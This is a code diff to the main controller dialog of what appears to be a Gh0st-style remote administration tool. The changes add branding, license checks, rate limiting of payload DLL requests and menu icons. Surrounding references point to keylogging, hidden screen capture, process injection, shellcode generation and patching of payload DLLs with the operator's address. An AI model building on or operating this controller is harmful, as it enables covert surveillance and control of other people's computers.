@@ -12,6 +12,7 @@
 #include "FileManagerDlg.h"
 #include "TalkDlg.h"
 #include "ShellDlg.h"
+#include "TerminalDlg.h"
 #include "SystemDlg.h"
 #include "BuildDlg.h"
 #include "AudioDlg.h"
@@ -19,18 +20,31 @@
 #include "ServicesDlg.h"
 #include "VideoDlg.h"
 #include <vector>
+#include <map>
+#include <mutex>
+#include <filesystem>
 #include "KeyBoardDlg.h"
 #include "InputDlg.h"
 #include "CPasswordDlg.h"
+#include "FeatureFlags.h"
+#include "FeatureLimitsDlg.h"
+#include "LicenseFile.h"
 #include "pwd_gen.h"
+#include "CrashReport.h"
 #include "common/location.h"
 #include <proxy/ProxyMapDlg.h>
-#include "DateVerify.h"
+#include "common/DateVerify.h"
+#include "common/IPWhitelist.h"
+#include "common/IPBlacklist.h"
 #include <fstream>
+#include <iomanip>
+#include <sstream>
 #include "common/skCrypter.h"
 #include "common/commands.h"
 #include "common/md5.h"
 #include <algorithm>
+#include <set>
+#include <atomic>
 #include "HideScreenSpyDlg.h"
 #include <sys/MachineDlg.h>
 #include "Chat.h"
@@ -40,15 +54,23 @@
 #include <file/CFileManagerDlg.h>
 #include "CDrawingBoard.h"
 #include "CWalletDlg.h"
+#include "NetworkDlg.h"
 #include <wallet.h>
 #include "CRcEditDlg.h"
 #include <thread>
 #include "common/file_upload.h"
 #include "SplashDlg.h"
+#include "SearchBarDlg.h"
 #include <ServerServiceWrapper.h>
 #include "CDlgFileSend.h"
 #include "CClientListDlg.h"
 #include "CUpdateDlg.h"
+#include "CLicenseDlg.h"
+#include "NotifyManager.h"
+#include "NotifySettingsDlg.h"
+#include "FrpsForSubDlg.h"
+#include "common/key.h"
+#include "UIBranding.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -59,9 +81,42 @@
 #define TIMER_CLOSEWND 2
 #define TIMER_CLEAR_BALLOON 3
 #define TIMER_HEARTBEAT_CHECK 4
+#define TIMER_REFRESH_LIST 5
+#define TIMER_STATUSBAR_UPDATE 6
+#define TIMER_STATUSBAR_INIT 7
 #define TODO_NOTICE MessageBoxL("This feature has not been implemented!\nPlease contact: 962914132@qq.com", "提示", MB_ICONINFORMATION);
 #define TINY_DLL_NAME "TinyRun.dll"
 #define FRPC_DLL_NAME "Frpc.dll"
+
+// 离线通知信息结构体 (用于 OfflineProc -> OnUserOfflineMsg 通信)
+struct OfflineInfo {
+    HWND hWnd;
+    CString ip;
+    std::string aliveInfo;
+    bool hasLogin;
+};
+
+// DLL 请求限流配置 (缓存，避免频繁读取注册表)
+static struct {
+    int limitSeconds = 3600;
+    int limitCount = 4;
+    bool loaded = false;
+} g_DllRateLimitConfig;
+
+void ReloadDllRateLimitConfig() {
+    g_DllRateLimitConfig.limitSeconds = THIS_CFG.GetInt("settings", "DllLimitSeconds", 3600);
+    g_DllRateLimitConfig.limitCount = THIS_CFG.GetInt("settings", "DllLimitCount", 4);
+    g_DllRateLimitConfig.loaded = true;
+}
+
+static int GetDllRateLimitSeconds() {
+    if (!g_DllRateLimitConfig.loaded) ReloadDllRateLimitConfig();
+    return g_DllRateLimitConfig.limitSeconds;
+}
+static int GetDllRateLimitCount() {
+    if (!g_DllRateLimitConfig.loaded) ReloadDllRateLimitConfig();
+    return g_DllRateLimitConfig.limitCount;
+}
 
 typedef struct {
     const char*   szTitle;     //列表的名称
@@ -100,8 +155,68 @@ int g_Column_Message_Width = 0;
 
 CMy2015RemoteDlg*  g_2015RemoteDlg = NULL;
 
+// 全局程序退出标志 - 用于通知所有分离线程停止运行
+// 这个标志必须是全局的，因为对话框销毁后，成员变量 isClosed 将不可访问
+std::atomic<bool> g_bAppExiting{false};
+
+// 服务端待续传传输状态
+std::map<uint64_t, PendingTransferV2> g_pendingTransfersV2;
+std::mutex g_pendingTransfersV2Mtx;
+
+// 检查客户端是否支持 V2 文件传输协议
+bool SupportsFileTransferV2(context* ctx) {
+    if (!g_2015RemoteDlg || !g_2015RemoteDlg->m_bEnableFileV2) return false;
+    if (!ctx) return false;
+    // 优先使用能力位检测（新客户端），回退到版本日期检测（旧客户端）
+    if (ctx->SupportsFileV2()) return true;
+    CString version = ctx->GetClientData(ONLINELIST_VERSION);
+    return IsDateGreaterOrEqual(version, FILE_TRANSFER_V2_DATE);
+}
+
+// 授权日志频率控制：首次必须记录，状态变化必须记录，相同状态每小时记录一次
+static bool ShouldLogAuth(const std::string& sn, bool success) {
+    struct AuthLogState {
+        bool lastStatus;
+        time_t lastLogTime;
+    };
+    static std::map<std::string, AuthLogState> s_cache;
+    static CRITICAL_SECTION s_lock;
+    static std::once_flag s_initFlag;
+    std::call_once(s_initFlag, []() {
+        InitializeCriticalSection(&s_lock);
+    });
+
+    EnterCriticalSection(&s_lock);
+    time_t now = time(nullptr);
+    bool shouldLog = false;
+
+    auto it = s_cache.find(sn);
+    if (it == s_cache.end()) {
+        // 首次 - 必须记录
+        s_cache[sn] = {success, now};
+        shouldLog = true;
+    } else {
+        AuthLogState& state = it->second;
+        if (state.lastStatus != success) {
+            // 状态变化 - 必须记录
+            state.lastStatus = success;
+            state.lastLogTime = now;
+            shouldLog = true;
+        } else if (now - state.lastLogTime >= 3600) {
+            // 相同状态，超过1小时 - 记录
+            state.lastLogTime = now;
+            shouldLog = true;
+        }
+    }
+    LeaveCriticalSection(&s_lock);
+    return shouldLog;
+}
+
 static UINT Indicators[] = {
-    IDR_STATUSBAR_STRING
+    IDR_STATUSBAR_STRING,
+    IDR_STATUSBAR_FRP,       // FRP 地址（由上级提供）
+    IDR_STATUSBAR_RUNTIME,
+    IDR_STATUSBAR_EXPIRE
 };
 
 std::string EventName()
@@ -130,6 +245,7 @@ public:
 
 protected:
     virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持
+    virtual BOOL OnInitDialog();
 
     // 实现
 protected:
@@ -145,6 +261,20 @@ void CAboutDlg::DoDataExchange(CDataExchange* pDX)
     __super::DoDataExchange(pDX);
 }
 
+BOOL CAboutDlg::OnInitDialog()
+{
+    __super::OnInitDialog();
+    // 多语言翻译 - Static控件
+    SetDlgItemText(IDC_STATIC_ABOUTBOX_YamaV12_2340, _TR(BRAND_APP_NAME "，V") + VERSION_STR);
+    SetDlgItemText(IDC_STATIC_ABOUTBOX_Copyleft__2341, _TR(BRAND_COPYRIGHT));
+
+    // 设置对话框标题和控件文本（解决英语系统乱码问题）
+    SetWindowText(_TR("关于") + CString(BRAND_SPLASH_NAME_W));
+    SetDlgItemText(IDOK, _TR("确定"));
+
+    return TRUE;
+}
+
 BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
 END_MESSAGE_MAP()
 
@@ -153,9 +283,9 @@ END_MESSAGE_MAP()
 
 std::string GetDbPath()
 {
-    static char path[MAX_PATH], *name = "YAMA.db";
+    static char path[MAX_PATH], *name = BRAND_DB_NAME;
     static std::string ret = (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path)) ? "." : path)
-                             + std::string("\\YAMA\\");
+                             + std::string("\\" BRAND_DATA_FOLDER "\\");
     static BOOL ok = CreateDirectoryA(ret.c_str(), NULL);
     static std::string dbPath = ret + name;
     return dbPath;
@@ -171,11 +301,19 @@ std::string GetFrpSettingsPath()
 #else
     static char path[MAX_PATH], * name = "frpc.ini";
     static std::string ret = (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path)) ? "." : path)
-                             + std::string("\\YAMA\\");
+                             + std::string("\\" BRAND_DATA_FOLDER "\\");
     static BOOL ok = CreateDirectoryA(ret.c_str(), NULL);
     static std::string p = ret + name;
     return p;
 #endif
+}
+
+// 从 master 配置中获取第一个 IP（支持分号分隔的多 IP 格式）
+std::string GetFirstMasterIP(const std::string& master)
+{
+    if (master.empty()) return "";
+    auto pos = master.find(';');
+    return pos != std::string::npos ? master.substr(0, pos) : master;
 }
 
 std::string GetFileName(const char* filepath)
@@ -260,7 +398,7 @@ DllInfo* ReadTinyRunDll(int pid)
     std::string s(skCrypt(FLAG_FINDEN)), ip, port;
     int offset = MemoryFind((char*)dllData, s.c_str(), fileSize, s.length());
     if (offset != -1) {
-        std::string ip = THIS_CFG.GetStr("settings", "master", "");
+        std::string ip = GetFirstMasterIP(THIS_CFG.GetStr("settings", "master", ""));
         int nPort = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
         std::string master = ip.empty() ? "" : ip + ":" + std::to_string(nPort);
         CONNECT_ADDRESS* server = (CONNECT_ADDRESS*)(dllData + offset);
@@ -359,17 +497,23 @@ std::string GetParentDir()
 
 std::string CMy2015RemoteDlg::GetHardwareID(int v)
 {
-    int version = v == -1 ? THIS_CFG.GetInt("settings", "BindType", 0) : v;
-    switch (version) {
+    int bindType = v == -1 ? THIS_CFG.GetInt("settings", "BindType", 0) : v;
+    switch (bindType) {
     case 0: {
-        static auto hardwareID = getHardwareID();
-        return hardwareID;
+        // Hardware binding: check HWIDVersion for V1/V2
+        int hwVersion = THIS_CFG.GetInt("settings", "HWIDVersion", 0);
+        if (hwVersion == 2) {
+            static auto hardwareID = getHardwareID_V2();
+            return hardwareID;
+        } else {
+            static auto hardwareID = getHardwareID();
+            return hardwareID;
+        }
     }
     case 1: {
         std::string master = THIS_CFG.GetStr("settings", "master");
         if (!master.empty()) return master;
-        IPConverter cvt;
-        std::string id = cvt.getPublicIP();
+        std::string id = g_2015RemoteDlg ? g_2015RemoteDlg->m_IPConverter->getPublicIP() : "";
         return id;
     }
     default:
@@ -410,6 +554,40 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogLangEx(CMy2015RemoteDl
     m_bmOnline[17].LoadBitmap(IDB_BITMAP_REGROUP);
     m_bmOnline[18].LoadBitmap(IDB_BITMAP_INJECT);
     m_bmOnline[19].LoadBitmap(IDB_BITMAP_PORTPROXY);
+    m_bmOnline[20].LoadBitmap(IDB_BITMAP_LOGINNOTIFY);
+    // New menu icons for session management and port proxy
+    m_bmOnline[21].LoadBitmap(IDB_BITMAP_SHUTDOWN);
+    m_bmOnline[22].LoadBitmap(IDB_BITMAP_REBOOT);
+    m_bmOnline[23].LoadBitmap(IDB_BITMAP_LOGOUT);
+    m_bmOnline[24].LoadBitmap(IDB_BITMAP_PORTPROXY_STD);
+    // Tray menu icons
+    m_bmOnline[25].LoadBitmap(IDB_BITMAP_SHOW);
+    m_bmOnline[26].LoadBitmap(IDB_BITMAP_EXIT);
+    // Main menu icons
+    m_bmOnline[27].LoadBitmap(IDB_BITMAP_SETTINGS);
+    m_bmOnline[28].LoadBitmap(IDB_BITMAP_WALLET);
+    m_bmOnline[29].LoadBitmap(IDB_BITMAP_NETWORK);
+    m_bmOnline[30].LoadBitmap(IDB_BITMAP_INPUTPASSWORD);
+    m_bmOnline[31].LoadBitmap(IDB_BITMAP_IMPORTLICENSE);
+    m_bmOnline[32].LoadBitmap(IDB_BITMAP_PEEDIT);
+    m_bmOnline[33].LoadBitmap(IDB_BITMAP_AUTHGEN);
+    m_bmOnline[34].LoadBitmap(IDB_BITMAP_GENMASTER);
+    m_bmOnline[35].LoadBitmap(IDB_BITMAP_LICENSEMGR);
+    m_bmOnline[36].LoadBitmap(IDB_BITMAP_KEYBOARD);
+    m_bmOnline[37].LoadBitmap(IDB_BITMAP_NOTIFY_MENU);
+    m_bmOnline[38].LoadBitmap(IDB_BITMAP_LOG);
+    m_bmOnline[39].LoadBitmap(IDB_BITMAP_HISTORY);
+    m_bmOnline[40].LoadBitmap(IDB_BITMAP_BACKUP);
+    m_bmOnline[41].LoadBitmap(IDB_BITMAP_IMPORT);
+    m_bmOnline[42].LoadBitmap(IDB_BITMAP_LANGUAGE);
+    m_bmOnline[43].LoadBitmap(IDB_BITMAP_REFRESH);
+    m_bmOnline[44].LoadBitmap(IDB_BITMAP_PLUGIN);
+    m_bmOnline[45].LoadBitmap(IDB_BITMAP_FRP);
+    m_bmOnline[46].LoadBitmap(IDB_BITMAP_HELP);
+    m_bmOnline[47].LoadBitmap(IDB_BITMAP_FEEDBACK);
+    m_bmOnline[48].LoadBitmap(IDB_BITMAP_TRIAL);
+    m_bmOnline[49].LoadBitmap(IDB_BITMAP_REQUESTAUTH);
+    m_bmOnline[50].LoadBitmap(IDB_BITMAP_CANCELSHARE);
 
     for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
         m_ServerDLL[i] = nullptr;
@@ -434,9 +612,11 @@ CMy2015RemoteDlg::~CMy2015RemoteDlg()
 {
     SAFE_DELETE(m_ClientMap);
     DeleteCriticalSection(&m_cs);
+    DeleteCriticalSection(&m_DllRateLimitLock);
     for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
         SAFE_DELETE(m_ServerDLL[i]);
         SAFE_DELETE(m_ServerBin[i]);
+        SAFE_DELETE(m_TinyRun[i]);
     }
     for (int i = 0; i < m_DllList.size(); i++) {
         SAFE_DELETE(m_DllList[i]);
@@ -445,15 +625,79 @@ CMy2015RemoteDlg::~CMy2015RemoteDlg()
         MemoryFreeLibrary(m_tinyDLL);
         m_tinyDLL = NULL;
     }
-    if (m_FileServer) {
-        m_FileServer->Stop();
-        SAFE_DELETE(m_FileServer);
+    if (m_pSearchBar) {
+        m_pSearchBar->DestroyWindow();
+        SAFE_DELETE(m_pSearchBar);
     }
+}
+
+// DLL 请求限流成员函数实现 (根据配置限制请求频率)
+bool CMy2015RemoteDlg::IsDllRequestLimited(const std::string& ip)
+{
+    // 白名单 IP 不限流
+    if (IPWhitelist::getInstance().IsWhitelisted(ip)) {
+        return false;
+    }
+
+    // 黑名单 IP 直接拒绝
+    if (IPBlacklist::getInstance().IsBlacklisted(ip)) {
+        // 防刷频日志
+        if (IPBlacklist::getInstance().ShouldLog(ip)) {
+            Mprintf("'%s' DLL request rejected (blacklisted)\n", ip.c_str());
+            char tip[256];
+            sprintf_s(tip, _TRF("IP %s DLL 请求被拒绝 (黑名单)"), ip.c_str());
+            PostMessageA(WM_SHOWERRORMSG, (LPARAM)new CString(tip), (WPARAM)new CString(_TR("黑名单")));
+        }
+        return true;
+    }
+
+    CLock lock(m_DllRateLimitLock);
+    time_t now = time(nullptr);
+    time_t cutoff = now - GetDllRateLimitSeconds();
+
+    auto it = m_DllRequestTimes.find(ip);
+    if (it != m_DllRequestTimes.end()) {
+        // 清理过期记录
+        auto& times = it->second;
+        times.erase(std::remove_if(times.begin(), times.end(),
+            [cutoff](time_t t) { return t < cutoff; }), times.end());
+
+        // 如果全部过期，删除条目释放内存
+        if (times.empty()) {
+            m_DllRequestTimes.erase(it);
+            return false;
+        }
+
+        // 检查是否达到限制
+        if (times.size() >= (size_t)GetDllRateLimitCount()) {
+            Mprintf("'%s' DLL request rate limited (%d requests in last hour)\n",
+                    ip.c_str(), (int)times.size());
+
+            // 发送到主窗口信息列表
+            char tip[256];
+            sprintf_s(tip, _TRF("IP %s DLL 请求被限流 (已请求 %d 次/小时)"), ip.c_str(), (int)times.size());
+            PostMessageA(WM_SHOWERRORMSG, (LPARAM)new CString(tip), (WPARAM)new CString(_TR("DLL 限流")));
+            return true;
+        }
+    }
+    return false;
+}
+
+void CMy2015RemoteDlg::RecordDllRequest(const std::string& ip)
+{
+    // 白名单 IP 不记录，避免浪费内存
+    if (IPWhitelist::getInstance().IsWhitelisted(ip)) {
+        return;
+    }
+
+    CLock lock(m_DllRateLimitLock);
+    m_DllRequestTimes[ip].push_back(time(nullptr));
 }
 
 void CMy2015RemoteDlg::DoDataExchange(CDataExchange* pDX)
 {
     __super::DoDataExchange(pDX);
+    m_CList_Online.SetVirtualMode(TRUE);  // 必须在 DDX_Control 前设置
     DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
     DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
     DDX_Control(pDX, IDC_GROUP_TAB, m_GroupTab);
@@ -464,15 +708,18 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_WM_PAINT()
     ON_WM_QUERYDRAGICON()
     ON_WM_SIZE()
+    ON_WM_EXITSIZEMOVE()
     ON_WM_TIMER()
     ON_WM_CLOSE()
     ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CMy2015RemoteDlg::OnNMRClickOnline)
+    ON_NOTIFY(LVN_GETDISPINFO, IDC_ONLINE, &CMy2015RemoteDlg::OnGetDispInfo)
     ON_NOTIFY(HDN_ITEMCLICK, 0, &CMy2015RemoteDlg::OnHdnItemclickList)
     ON_COMMAND(ID_ONLINE_MESSAGE, &CMy2015RemoteDlg::OnOnlineMessage)
     ON_COMMAND(ID_ONLINE_DELETE, &CMy2015RemoteDlg::OnOnlineDelete)
     ON_COMMAND(ID_ONLINE_UPDATE, &CMy2015RemoteDlg::OnOnlineUpdate)
     ON_COMMAND(IDM_ONLINE_ABOUT, &CMy2015RemoteDlg::OnAbout)
     ON_COMMAND(ID_HELP, &CMy2015RemoteDlg::OnAbout)
+    ON_COMMAND(ID_TOOLBAR_SEARCH, &CMy2015RemoteDlg::OnToolbarSearch)
 
     ON_COMMAND(IDM_ONLINE_CMD, &CMy2015RemoteDlg::OnOnlineCmdManager)
     ON_COMMAND(IDM_ONLINE_PROCESS, &CMy2015RemoteDlg::OnOnlineProcessManager)
@@ -496,6 +743,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_MESSAGE(WM_OPENFILEMANAGERDIALOG, OnOpenFileManagerDialog)
     ON_MESSAGE(WM_OPENTALKDIALOG, OnOpenTalkDialog)
     ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
+    ON_MESSAGE(WM_OPENTERMINALDIALOG, OnOpenTerminalDialog)
     ON_MESSAGE(WM_OPENSYSTEMDIALOG, OnOpenSystemDialog)
     ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
     ON_MESSAGE(WM_OPENSERVICESDIALOG, OnOpenServicesDialog)
@@ -544,10 +792,15 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_TOOL_GEN_SHELLCODE, &CMy2015RemoteDlg::OnToolGenShellcode)
     ON_COMMAND(ID_ONLINE_ASSIGN_TO, &CMy2015RemoteDlg::OnOnlineAssignTo)
     ON_NOTIFY(NM_CUSTOMDRAW, IDC_MESSAGE, &CMy2015RemoteDlg::OnNMCustomdrawMessage)
+    ON_NOTIFY(NM_RCLICK, IDC_MESSAGE, &CMy2015RemoteDlg::OnRClickMessage)
+    ON_COMMAND(ID_MSGLOG_DELETE, &CMy2015RemoteDlg::OnMsglogDelete)
+    ON_COMMAND(ID_MSGLOG_CLEAR, &CMy2015RemoteDlg::OnMsglogClear)
     ON_COMMAND(ID_ONLINE_ADD_WATCH, &CMy2015RemoteDlg::OnOnlineAddWatch)
+    ON_COMMAND(ID_ONLINE_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnOnlineLoginNotify)
     ON_NOTIFY(NM_CUSTOMDRAW, IDC_ONLINE, &CMy2015RemoteDlg::OnNMCustomdrawOnline)
     ON_COMMAND(ID_ONLINE_RUN_AS_ADMIN, &CMy2015RemoteDlg::OnOnlineRunAsAdmin)
     ON_COMMAND(ID_MAIN_WALLET, &CMy2015RemoteDlg::OnMainWallet)
+    ON_COMMAND(ID_MAIN_NETWORK, &CMy2015RemoteDlg::OnMainNetwork)
     ON_COMMAND(ID_TOOL_RCEDIT, &CMy2015RemoteDlg::OnToolRcedit)
     ON_COMMAND(ID_ONLINE_UNINSTALL, &CMy2015RemoteDlg::OnOnlineUninstall)
     ON_COMMAND(ID_ONLINE_PRIVATE_SCREEN, &CMy2015RemoteDlg::OnOnlinePrivateScreen)
@@ -573,16 +826,31 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_ONLINE_INJ_NOTEPAD, &CMy2015RemoteDlg::OnOnlineInjNotepad)
     ON_COMMAND(ID_PARAM_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnParamLoginNotify)
     ON_COMMAND(ID_PARAM_ENABLE_LOG, &CMy2015RemoteDlg::OnParamEnableLog)
+    ON_COMMAND(ID_PARAM_PRIVACY_WALLPAPER, &CMy2015RemoteDlg::OnParamPrivacyWallpaper)
+    ON_COMMAND(ID_PARAM_FILE_V2, &CMy2015RemoteDlg::OnParamFileV2)
+    ON_COMMAND(ID_PARAM_RUN_AS_USER, &CMy2015RemoteDlg::OnParamRunAsUser)
     ON_COMMAND(ID_PROXY_PORT, &CMy2015RemoteDlg::OnProxyPort)
     ON_COMMAND(ID_HOOK_WIN, &CMy2015RemoteDlg::OnHookWin)
     ON_COMMAND(ID_RUNAS_SERVICE, &CMy2015RemoteDlg::OnRunasService)
-        ON_COMMAND(ID_HISTORY_CLIENTS, &CMy2015RemoteDlg::OnHistoryClients)
-        ON_COMMAND(ID_BACKUP_DATA, &CMy2015RemoteDlg::OnBackupData)
-        ON_COMMAND(ID_PLUGIN_REQUEST, &CMy2015RemoteDlg::OnPluginRequest)
-        ON_COMMAND(ID_CHANGE_LANG, &CMy2015RemoteDlg::OnChangeLang)
-        ON_COMMAND(ID_IMPORT_DATA, &CMy2015RemoteDlg::OnImportData)
-        ON_COMMAND(ID_PROXY_PORT_STD, &CMy2015RemoteDlg::OnProxyPortStd)
-        ON_COMMAND(ID_CHOOSE_LANG_DIR, &CMy2015RemoteDlg::OnChooseLangDir)
+    ON_COMMAND(ID_HISTORY_CLIENTS, &CMy2015RemoteDlg::OnHistoryClients)
+    ON_COMMAND(ID_BACKUP_DATA, &CMy2015RemoteDlg::OnBackupData)
+    ON_COMMAND(ID_PLUGIN_REQUEST, &CMy2015RemoteDlg::OnPluginRequest)
+    ON_COMMAND(ID_CHANGE_LANG, &CMy2015RemoteDlg::OnChangeLang)
+    ON_COMMAND(ID_IMPORT_DATA, &CMy2015RemoteDlg::OnImportData)
+    ON_COMMAND(ID_PROXY_PORT_STD, &CMy2015RemoteDlg::OnProxyPortStd)
+    ON_COMMAND(ID_CHOOSE_LANG_DIR, &CMy2015RemoteDlg::OnChooseLangDir)
+    ON_COMMAND(ID_LOCATION_QQWRY, &CMy2015RemoteDlg::OnLocationQqwry)
+    ON_COMMAND(ID_LOCATION_IP2REGION, &CMy2015RemoteDlg::OnLocationIp2region)
+    ON_COMMAND(ID_TOOL_LICENSE_MGR, &CMy2015RemoteDlg::OnToolLicenseMgr)
+    ON_COMMAND(ID_TOOL_IMPORT_LICENSE, &CMy2015RemoteDlg::OnToolImportLicense)
+    ON_COMMAND(ID_TOOL_V2_PRIVATEKEY, &CMy2015RemoteDlg::OnToolV2PrivateKey)
+    ON_COMMAND(ID_MENU_NOTIFY_SETTINGS, &CMy2015RemoteDlg::OnMenuNotifySettings)
+        ON_COMMAND(ID_EXECUTE_TESTRUN, &CMy2015RemoteDlg::OnExecuteTestrun)
+        ON_COMMAND(ID_EXECUTE_GHOST, &CMy2015RemoteDlg::OnExecuteGhost)
+        ON_COMMAND(ID_MASTER_TRAIL, &CMy2015RemoteDlg::OnMasterTrail)
+        ON_COMMAND(ID_FRPS_FOR_SUB, &CMy2015RemoteDlg::OnFrpsForSub)
+        ON_COMMAND(ID_CANCEL_SHARE, &CMy2015RemoteDlg::OnCancelShare)
+        ON_COMMAND(ID_WEB_REMOTE_CONTROL, &CMy2015RemoteDlg::OnWebRemoteControl)
         END_MESSAGE_MAP()
 
 
@@ -602,7 +870,10 @@ void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
     case WM_RBUTTONDOWN: {
         CMenu Menu;
         Menu.LoadMenu(IDR_MENU_NOTIFY);
-		TranslateMenu(&Menu);
+        TranslateMenu(&Menu);
+        // Set tray menu icons
+        Menu.SetMenuItemBitmaps(IDM_NOTIFY_SHOW, MF_BYCOMMAND, &m_bmOnline[25], &m_bmOnline[25]);
+        Menu.SetMenuItemBitmaps(ID_NOTIFY_EXIT, MF_BYCOMMAND, &m_bmOnline[26], &m_bmOnline[26]);
         CPoint Point;
         GetCursorPos(&Point);
         SetForegroundWindow();   //设置当前窗口
@@ -615,19 +886,211 @@ void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
     }
 }
 
+// 通过菜单项ID查找子菜单（避免硬编码索引，菜单项删除后索引会变化）
+CMenu* CMy2015RemoteDlg::FindSubMenuByCommand(CMenu* pParent, UINT commandId)
+{
+    if (!pParent) return nullptr;
+    for (UINT i = 0; i < pParent->GetMenuItemCount(); i++) {
+        CMenu* pSub = pParent->GetSubMenu(i);
+        if (pSub && pSub->GetMenuState(commandId, MF_BYCOMMAND) != (UINT)-1) {
+            return pSub;
+        }
+    }
+    return nullptr;
+}
+
 VOID CMy2015RemoteDlg::CreateSolidMenu()
 {
     m_MainMenu.LoadMenu(IDR_MENU_MAIN);
     TranslateMenu(&m_MainMenu);
     CMenu* SubMenu = m_MainMenu.GetSubMenu(1);
     std::string masterHash(GetMasterHash());
-    if (GetPwdHash() != masterHash) {
+	std::string pwd = THIS_CFG.GetStr("settings", "Password");
+    if (pwd.empty()) {
         SubMenu->DeleteMenu(ID_TOOL_GEN_MASTER, MF_BYCOMMAND);
     }
     SubMenu = m_MainMenu.GetSubMenu(4);
-    if (!THIS_CFG.GetStr("settings", "Password").empty()) {
+    if (!pwd.empty()) {
         SubMenu->ModifyMenuL(ID_TOOL_REQUEST_AUTH, MF_STRING, ID_TOOL_REQUEST_AUTH, _T("序列号"));
     }
+
+    // Set main menu icons - File menu
+    m_MainMenu.SetMenuItemBitmaps(ID_MAIN_SET, MF_BYCOMMAND, &m_bmOnline[27], &m_bmOnline[27]);
+    m_MainMenu.SetMenuItemBitmaps(ID_MENU_NOTIFY_SETTINGS, MF_BYCOMMAND, &m_bmOnline[37], &m_bmOnline[37]);
+    m_MainMenu.SetMenuItemBitmaps(ID_MAIN_WALLET, MF_BYCOMMAND, &m_bmOnline[28], &m_bmOnline[28]);
+    m_MainMenu.SetMenuItemBitmaps(ID_MAIN_NETWORK, MF_BYCOMMAND, &m_bmOnline[29], &m_bmOnline[29]);
+    m_MainMenu.SetMenuItemBitmaps(ID_MAIN_EXIT, MF_BYCOMMAND, &m_bmOnline[26], &m_bmOnline[26]);
+    // Tools menu
+    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_INPUT_PASSWORD, MF_BYCOMMAND, &m_bmOnline[30], &m_bmOnline[30]);
+    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_IMPORT_LICENSE, MF_BYCOMMAND, &m_bmOnline[31], &m_bmOnline[31]);
+    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_RCEDIT, MF_BYCOMMAND, &m_bmOnline[32], &m_bmOnline[32]);
+    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_AUTH, MF_BYCOMMAND, &m_bmOnline[33], &m_bmOnline[33]);
+    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_GEN_MASTER, MF_BYCOMMAND, &m_bmOnline[34], &m_bmOnline[34]);
+    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_LICENSE_MGR, MF_BYCOMMAND, &m_bmOnline[35], &m_bmOnline[35]);
+    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_V2_PRIVATEKEY, MF_BYCOMMAND, /*&m_bmOnline[30]*/0, /*&m_bmOnline[30]*/0);
+    // Parameters menu
+    m_MainMenu.SetMenuItemBitmaps(ID_PARAM_KBLOGGER, MF_BYCOMMAND, /*&m_bmOnline[36]*/0, /*&m_bmOnline[36]*/0);
+    m_MainMenu.SetMenuItemBitmaps(ID_PARAM_LOGIN_NOTIFY, MF_BYCOMMAND, /*&m_bmOnline[37]*/0, /*&m_bmOnline[37]*/0);
+    m_MainMenu.SetMenuItemBitmaps(ID_PARAM_ENABLE_LOG, MF_BYCOMMAND, /*&m_bmOnline[38]*/0, /*&m_bmOnline[38]*/0);
+    // Extensions menu
+    m_MainMenu.SetMenuItemBitmaps(ID_HISTORY_CLIENTS, MF_BYCOMMAND, &m_bmOnline[39], &m_bmOnline[39]);
+    m_MainMenu.SetMenuItemBitmaps(ID_BACKUP_DATA, MF_BYCOMMAND, &m_bmOnline[40], &m_bmOnline[40]);
+    m_MainMenu.SetMenuItemBitmaps(ID_IMPORT_DATA, MF_BYCOMMAND, &m_bmOnline[41], &m_bmOnline[41]);
+    m_MainMenu.SetMenuItemBitmaps(ID_CHANGE_LANG, MF_BYCOMMAND, &m_bmOnline[42], &m_bmOnline[42]);
+    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_RELOAD_PLUGINS, MF_BYCOMMAND, &m_bmOnline[43], &m_bmOnline[43]);
+    m_MainMenu.SetMenuItemBitmaps(ID_PLUGIN_REQUEST, MF_BYCOMMAND, &m_bmOnline[44], &m_bmOnline[44]);
+    m_MainMenu.SetMenuItemBitmaps(ID_FRPS_FOR_SUB, MF_BYCOMMAND, &m_bmOnline[45], &m_bmOnline[45]);
+    // Help menu
+    m_MainMenu.SetMenuItemBitmaps(ID_HELP_IMPORTANT, MF_BYCOMMAND, &m_bmOnline[46], &m_bmOnline[46]);
+    m_MainMenu.SetMenuItemBitmaps(ID_HELP_FEEDBACK, MF_BYCOMMAND, &m_bmOnline[47], &m_bmOnline[47]);
+    m_MainMenu.SetMenuItemBitmaps(ID_WHAT_IS_THIS, MF_BYCOMMAND, &m_bmOnline[46], &m_bmOnline[46]);
+    m_MainMenu.SetMenuItemBitmaps(ID_MASTER_TRAIL, MF_BYCOMMAND, &m_bmOnline[48], &m_bmOnline[48]);
+    m_MainMenu.SetMenuItemBitmaps(ID_TOOL_REQUEST_AUTH, MF_BYCOMMAND, &m_bmOnline[49], &m_bmOnline[49]);
+
+    // ============================================================
+    //  UIBranding: 根据编译时配置隐藏菜单项
+    // ============================================================
+
